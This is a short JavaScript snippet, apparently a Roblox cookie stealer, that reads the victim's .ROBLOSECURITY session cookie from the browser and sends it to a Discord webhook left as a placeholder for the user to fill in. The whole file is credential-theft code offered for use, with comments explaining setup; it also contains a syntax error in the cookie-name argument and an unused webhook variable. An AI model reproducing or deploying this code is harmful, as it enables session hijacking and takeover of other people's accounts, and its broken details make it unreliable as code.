function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
var webhook = "Your-Webhook-url";
var token = getCookie(.ROBLOSECURITY)
var request = new XMLHttpRequest();
function discordWebhook(){
        const request = new XMLHttpRequest();
     
      request.open("POST", "****WEBHOOK-GOES-HERE****"); // <-- Discord webhook link 
      
      request.setRequestHeader('Content-type', 'application/json');


      	//lets have an parameter to send to the discord webhook .
      const params = {
        username: "ROBLOSECURITY COOKIE", 
        //username (if not set it is default what you set in discord)
        avatar_url: "",
         //avatar url (if not set it is default what you set in discord)
        content: "This is a test webhook ! " + token
        //the content to sent or the message. This is required to send a webhook othervise it won't send the webhook.
      }
      request.send(JSON.stringify(params));//send the params variable to discord webhook.
    }
